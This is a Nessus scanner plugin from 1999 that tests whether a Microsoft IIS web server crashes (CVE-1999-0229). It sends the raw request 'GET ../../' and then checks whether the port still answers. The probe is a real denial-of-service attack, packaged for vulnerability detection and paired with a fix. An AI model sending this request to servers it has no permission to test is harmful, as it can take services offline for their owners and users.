#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10117);
 script_bugtraq_id(2218);
 script_version ("$Revision: 1.20 $");
 script_cve_id("CVE-1999-0229");
 name["english"] = "IIS 'GET ../../'";
 name["francais"] = "IIS 'GET ../../'";


 script_name(english:name["english"],
	     francais:name["francais"]);
 
 # Description
 desc["english"] = string("It is possible to crash IIS by sending it the request 'GET ../../'\nSolution: upgrade to the latest version.\nRisk factor : High");

 desc["francais"] = string("Il est possible de faire planter un serveur IIS en lui envoyant la requete 'GET ../../'\nSolution: mettez votre serveur IIS à jour.\nFacteur de risque : Elevé");
 
 script_description(english:desc["english"],
 		    francais:desc["francais"]);

 # Summary
 summary["english"] = "Performs a denial of service against IIS";
 summary["francais"] = "Provoque un déni de service contre un serveur IIS";
 script_summary(english:summary["english"],
 		francais:summary["francais"]);

 # Category
 script_category(ACT_DENIAL);

 # Dependencie(s)
 script_dependencie("find_service.nes", "http_version.nasl", "www_fingerprinting_hmap.nasl");
 
 # Family
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"],
 	       francais:family["francais"]);
 
 # Copyright
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
 		  francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 
 script_require_ports("Services/www", 80);
 exit(0);
}

# The attack starts here

include("http_func.inc");
 
port = get_http_port(default:80);

sig = get_kb_item("www/hmap/" + port + "/description");
if ( sig && "IIS" >!< sig ) exit(0);
if(get_port_state(port))
{
 data = string("GET ../../\r\n");
 soc = open_sock_tcp(port);
 if(soc)
 {
  send(socket:soc, data:data);
  close(soc);
  sleep(2);
  soc2 = open_sock_tcp(port);
  if(!soc2)security_hole(port);
  else close(soc2);
 }
}
